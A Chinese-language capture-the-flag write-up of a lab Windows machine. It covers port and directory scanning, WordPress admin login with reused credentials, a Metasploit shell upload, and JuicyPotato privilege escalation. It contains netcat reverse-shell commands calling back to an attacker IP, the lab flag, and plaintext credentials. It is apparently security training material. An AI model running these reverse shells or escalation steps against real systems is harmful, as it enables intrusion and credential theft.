0x01 端口扫描

目标：10.10.10.29

使用

nmap 10.10.10.29

进行端口扫描

开放了80,3306端口，windows服务器，然后访问80端口

发现是个IIS的服务页面

使用Dirbuster跑一下目录，发现是wordpress，我们使用kali自带的字典即可

/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt


看到wordpress第一反应wpscan跑一下

没有什么diao用，有的老哥扫到的admin用户，我并没有，可能是我姿势有问题

0x02 wp-admin漏洞利用

1、目录扫描下有wp-admin,此处密码在Vaccine中获得

username：adminpassword:P@s5w0rd!

成功登录

2、metasploit里有wp-admin利用模块

msfconsolesearch wp_adminuse 0show optionsset PASSWORD P@s5w0rd!set rhosts 10.10.10.29set TARGETURI /wordpressset USERNAME admin

此处LHOST需要设置成内网隧道拨的地址，而不是本机的192.168那种的。

run起来，成功获得shell，但shell不是特别稳定


0x03 提权拿flag

避坑指南

下方所有路径均会随着自己机器生成而改动，并非固定下列所有上传工具均为EXEnc下载地址：https://eternallybored.org/misc/netcat/Juicy Potato下载地址：https://github.com/ohpe/juicy-potato/releasesmimikatz下载地址：https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210531

首先上传一手nc解决一下shell不稳的情况，起个监听

nc -nvvlp 1234upload /root/桌面/netcat-win32-1.12/nc64.exe //(此处为nc64的路径)execute -f nc64.exe -a "-e cmd.exe 10.10.16.23 1234"

针对windows  server 2016，此系统容易受到Rotten Potato攻击

生成一个批处理文件目的是让netcat将靶机的powershell发送至kali的监听端口

echo START C:\inetpub\wwwroot\wordpress\wp-content\plugins\vwwhMqknRo\nc64.exe -e powershell.exe 10.10.16.23 111 > shell.bat

此处还需要上传Rotten Potato利用工具

dir一下，如果存在以下文件即可开始提权

使用JuicyPotato.exe进行提权

juicyPotato.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\vRxdRaShRV\shell.bat -l 111

flag在C:\users\Administrator\Desktop\root.txt中

more C:\users\Administrator\Desktop\root.txt

flag为：6e9a9fdc6f64e410a68b847bb4b404fa

此处后续操作可以上传mimikatz获取域内账户密码，可能会用到下一个靶机上

此处就不截图的，使用方法可以自行百度

获得了一个账号名：sandra  密码：Password1234！
